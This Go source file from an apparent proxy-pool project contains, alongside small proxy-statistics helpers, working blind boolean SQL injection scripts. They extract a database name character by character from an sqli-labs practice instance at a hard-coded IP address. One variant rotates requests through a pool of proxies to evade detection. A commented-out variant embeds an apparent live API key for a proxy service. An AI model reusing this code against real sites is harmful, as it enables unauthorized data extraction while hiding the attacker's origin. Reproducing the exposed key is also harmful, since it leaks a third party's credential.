package API

import (
	"ProxyPool/RedisDB"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func Statistics() (All, Useful int) { // 用于统计当前数据库中的IP代理情况
	AllIPList := RedisDB.AllIPNow()
	All = len(AllIPList) // 先统计当前数据库内IP代理的条目

	Useful = 0
	for _, v := range AllIPList {
		if 100 == RedisDB.APICheckValue(v) {
			Useful += 1
		}
	}
	return
}

func GetIPproxy(num byte) (Flag bool) {
	Flag = RedisDB.ReturnIP(num)
	return
}

func SQLinjectionASCII() {
	var dbname string
	for i := 0; i < 8; i++ { // 8表示当前数据库字段的长度为8 需提前已知
		var word string
		for j := 0; j < 26; j++ { // 测试26个小写字母即可
			l1 := fmt.Sprintf("http://118.195.249.178/sqli-labs-master/Less-8/?id=1%%27+and+ascii(substr(database(),%d,1))=%d--+", i+1, 97+j) // 【sprintf %% 表示字面量的%】 【%.f 表示不保留小数点】
			result := httpRequest(l1)
			if strings.Contains(result, "You are in") { // 当 you are in 在返回包 说明true
				word = string(rune(97 + j)) // 把每个比特位加起来就是这个字符
				break
			}
		}
		fmt.Printf("第%d位字母是：-> %s\n", i+1, word) //打印第几位的字符
		dbname += word                           // 每个字符拼接到dbname

	}
	fmt.Printf("数据库名为: %s", dbname) //最终爆破的库名
}

func httpRequest(url string) (result string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("get err", err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("err")
		return
	}
	return string(body)
}

func SQLinjectionIP() {
	var dbname string
	for i := 0; i < 8; i++ { // 8表示当前数据库字段的长度为8 需提前已知
		var word string
		for j := 0; j < 26; j++ { // 2的0到6次方足够
			IPproxy := RedisDB.ReturnOneIP()
			l1 := fmt.Sprintf("http://118.195.249.178/sqli-labs-master/Less-8/?id=1%%27+and+ascii(substr(database(),%d,1))=%d--+", i+1, 97+j) // 【sprintf %% 表示字面量的%】 【%.f 表示不保留小数点】
			proxyURL, err := url.Parse(IPproxy)
			if err != nil {
				panic(err)
			}
			transport := &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}
			client := &http.Client{
				Transport: transport,
				Timeout:   10 * time.Second, // 设置超时时间，可根据需求调整
			}
			response, err := client.Get(l1)
			if err != nil {
				fmt.Println("get err", err)
				j--
				continue
			}
			defer response.Body.Close()
			body, err := ioutil.ReadAll(response.Body)
			if err != nil {
				fmt.Println("err")
				return
			}
			result := string(body)
			if strings.Contains(result, "Less-8") {
				fmt.Printf("ascii(substr(database(),%d,1))=%d--+ %s 已通过该代理进行SQL注入测试\n", i+1, 97+j, IPproxy)
				if strings.Contains(result, "You are in") { // 当 you are in 在返回包 说明true
					word = string(rune(97 + j)) // 把每个比特位加起来就是这个字符
					break
				}
			} else {
				j--
			}
		}
		fmt.Printf("第%d位字母是：-> %s\n", i+1, word) //打印第几位的字符
		dbname += word                           // 每个字符拼接到dbname

	}
	fmt.Printf("数据库名为: %s\n", dbname) //最终爆破的库名
}

//func SQLinjectionIPfunny() {
//	var dbname string
//	for i := 1; i <= 8; i++ { // 8表示当前数据库字段的长度为8 需提前已知
//		var word int
//		for j := 0; j < 7; j++ { // 2的0到6次方足够
//			head := "http://"
//			var body string
//			time.Sleep(time.Second * 5)
//			body = strings.TrimSuffix(httpRequest("http://dev.qydailiip.com/api/?apikey=d8cf2c7607174f90b5cd5ef6561ac42b9d1fc6f6&num=1&type=text&line=win&proxy_type=putong&sort=rand&model=all&protocol=http&address=&kill_address=&port=&kill_port=&today=true&abroad=1&isp=&anonymity=2"), "\r\n")
//			IPproxy := head + body
//			status := Check.TestIP(IPproxy)
//			if status {
//				l1 := fmt.Sprintf("http://118.195.249.178/sqli-labs-master/Less-8/?id=1'+and+"+"ord(substr(database(),%d,1))%%26%.f--+-", i, math.Pow(2, float64(j))) // 【sprintf %% 表示字面量的%】 【%.f 表示不保留小数点】
//				proxyURL, err := url.Parse(IPproxy)
//				if err != nil {
//					panic(err)
//				}
//				transport := &http.Transport{
//					Proxy: http.ProxyURL(proxyURL),
//				}
//				client := &http.Client{
//					Transport: transport,
//					Timeout:   10 * time.Second, // 设置超时时间，可根据需求调整
//				}
//				response, err := client.Get(l1)
//				if err != nil {
//					fmt.Println("get err", err)
//					j--
//					continue
//				}
//				fmt.Println(IPproxy, "已通过该代理进行SQL注入测试")
//				defer response.Body.Close()
//				body, err := ioutil.ReadAll(response.Body)
//				if err != nil {
//					fmt.Println("err")
//					return
//				}
//				result := string(body)
//				if strings.Contains(result, "You are in") { // 当 you are in 在返回包 说明true
//					word += int(math.Pow(2, float64(j))) // 把每个比特位加起来就是这个字符
//				}
//			} else {
//				j--
//			}
//		}
//		fmt.Printf("第%d位字母是：-> %s\n", i, string(rune(word))) //打印第几位的字符
//		dbname += string(rune(word))                         // 每个字符拼接到dbname
//
//	}
//	fmt.Printf("数据库名为: %s", dbname) //最终爆破的库名
//}
